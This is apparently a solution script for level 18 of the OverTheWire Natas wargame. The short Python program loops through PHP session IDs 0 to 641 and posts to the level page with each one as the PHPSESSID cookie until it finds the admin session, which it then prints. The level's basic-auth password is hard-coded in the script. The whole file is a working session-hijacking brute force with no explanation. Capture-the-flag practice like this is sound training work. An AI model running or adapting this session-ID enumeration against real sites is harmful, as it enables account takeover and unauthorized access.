#!/usr/bin python

import requests
from requests.auth import HTTPBasicAuth

data = { 'username': 'admin', 'password': 'admin' }
url = 'http://natas18.natas.labs.overthewire.org/index.php'

s = requests.Session()
for i in range(0, 642):
    req = s.post(url, auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), data=data, cookies=dict(PHPSESSID=str(i)))
    if "You are an admin" in req.text:
        print(req.text)
        print(i)


